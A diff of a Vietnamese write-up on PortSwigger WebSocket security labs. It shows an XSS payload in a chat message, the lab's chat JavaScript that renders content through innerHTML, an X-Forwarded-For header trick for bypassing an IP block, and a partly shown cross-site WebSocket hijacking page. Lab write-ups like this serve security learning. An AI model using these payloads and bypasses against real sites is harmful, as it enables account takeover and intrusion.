@@ -175,7 +175,7 @@ Kiểm tra cách message được render trong tag `<td>`
 
 ### Khai thác
 
-    - Gửi message với XSS payload ```<img src=1 onerror=alert(1)>```
+- Gửi message với XSS payload `<img src=1 onerror=alert(1)>`
 
 ![image](https://hackmd.io/_uploads/HyHSjkYqp.png)
 
@@ -315,6 +315,131 @@ Nhấp vào "Kết nối lại" và quan sát rằng nỗ lực kết nối khô
 
 ![image](https://hackmd.io/_uploads/BJCx_Xtqa.png)
 
+![image](https://hackmd.io/_uploads/HJWwzVF56.png)
+
+mình địc source code của file này được
+
+```javascript
+(function () {
+  var chatForm = document.getElementById("chatForm");
+  var messageBox = document.getElementById("message-box");
+  var webSocket = openWebSocket();
+
+  messageBox.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" && !e.shiftKey) {
+      e.preventDefault();
+      sendMessage(new FormData(chatForm));
+      chatForm.reset();
+    }
+  });
+
+  chatForm.addEventListener("submit", function (e) {
+    e.preventDefault();
+    sendMessage(new FormData(this));
+    this.reset();
+  });
+
+  function writeMessage(className, user, content) {
+    var row = document.createElement("tr");
+    row.className = className;
+
+    var userCell = document.createElement("th");
+    var contentCell = document.createElement("td");
+    userCell.innerHTML = user;
+    contentCell.innerHTML =
+      typeof window.renderChatMessage === "function"
+        ? window.renderChatMessage(content)
+        : content;
+
+    row.appendChild(userCell);
+    row.appendChild(contentCell);
+    document.getElementById("chat-area").appendChild(row);
+  }
+
+  function sendMessage(data) {
+    var object = {};
+    data.forEach(function (value, key) {
+      object[key] = htmlEncode(value);
+    });
+
+    openWebSocket().then((ws) => ws.send(JSON.stringify(object)));
+  }
+
+  function htmlEncode(str) {
+    if (chatForm.getAttribute("encode")) {
+      return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
+        var lookup = {
+          "\\": "&#x5c;",
+          "\r": "&#x0d;",
+          "\n": "&#x0a;",
+          '"': "&quot;",
+          "<": "&lt;",
+          ">": "&gt;",
+          "'": "&#39;",
+          "&": "&amp;",
+        };
+        return lookup[c];
+      });
+    }
+    return str;
+  }
+
+  function openWebSocket() {
+    return new Promise((res) => {
+      if (webSocket) {
+        res(webSocket);
+        return;
+      }
+
+      let newWebSocket = new WebSocket(chatForm.getAttribute("action"));
+
+      newWebSocket.onopen = function (evt) {
+        writeMessage("system", "System:", "No chat history on record");
+        newWebSocket.send("READY");
+        res(newWebSocket);
+      };
+
+      newWebSocket.onmessage = function (evt) {
+        var message = evt.data;
+
+        if (message === "TYPING") {
+          writeMessage("typing", "", "[typing...]");
+        } else {
+          var messageJson = JSON.parse(message);
+          if (messageJson && messageJson["user"] !== "CONNECTED") {
+            Array.from(document.getElementsByClassName("system")).forEach(
+              function (element) {
+                element.parentNode.removeChild(element);
+              }
+            );
+          }
+          Array.from(document.getElementsByClassName("typing")).forEach(
+            function (element) {
+              element.parentNode.removeChild(element);
+            }
+          );
+
+          if (messageJson["user"] && messageJson["content"]) {
+            writeMessage(
+              "message",
+              messageJson["user"] + ":",
+              messageJson["content"]
+            );
+          } else if (messageJson["error"]) {
+            writeMessage("message", "Error:", messageJson["error"]);
+          }
+        }
+      };
+
+      newWebSocket.onclose = function (evt) {
+        webSocket = undefined;
+        writeMessage("message", "System:", "--- Disconnected ---");
+      };
+    });
+  }
+})();
+```
+
 - Thêm header `X-Forwarded-For: 127.0.0.1` để bypass IP block.
 
 ![image](https://hackmd.io/_uploads/HJMI_7t56.png)
@@ -350,7 +475,7 @@ mình đã viết lại script khai thác
  <body>
    <script>
      const socket = new WebSocket(
-       "wss://0a7c00b4037333cd8304dca300df00ee.web-security-academy.net/chat"
+       "wss://0a3200b404b9c5af82960bfd002a00ac.web-security-academy.net/chat"
      );
 
      socket.addEventListener("open", (event) => {
@@ -375,3 +500,7 @@ mình đã viết lại script khai thác
  </body>
 </html>
 ```
+
+![image](https://hackmd.io/_uploads/BJQUXEt9a.png)
+
+![image](https://hackmd.io/_uploads/ByvYmNK56.png)
